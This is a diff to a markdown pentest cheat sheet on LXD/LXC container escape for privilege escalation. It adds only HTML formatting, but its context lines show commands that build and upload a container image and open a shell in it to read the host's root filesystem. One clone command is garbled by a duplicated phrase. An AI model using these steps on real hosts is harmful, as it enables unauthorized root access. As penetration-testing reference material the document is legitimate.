@@ -7,6 +7,8 @@ tags: ["lxd", "lxc", "privesc", "container", "escape"]
 ---
 ### Basic Commands
 
+<div>
+
 ```bash
 # Check if user in lxd group
 id
@@ -22,7 +24,15 @@ lxc list
 lxc image list
 ```
 
+</div>
+
+<br>
+
+---
+
 ### Abuse #1: Mount host's file system
+
+<div>
 
 ```bash
 # Upload a 656 bytes conatiner image
@@ -69,7 +79,15 @@ lxc exec testVM -- /bin/bash
 ls -la /r/root
 ```
 
+</div>
+
+<br>
+
+---
+
 ### Build image for other arch
+
+<div>
 
 ```bash
 git clone git clone https://github.com/saghul/lxd-alpine-builder
@@ -83,5 +101,7 @@ cd lxd-alpine-builder
 # For example arch i686
 sudo ./build-alpine -a i686
 ```
+
+</div>
 
 <br>
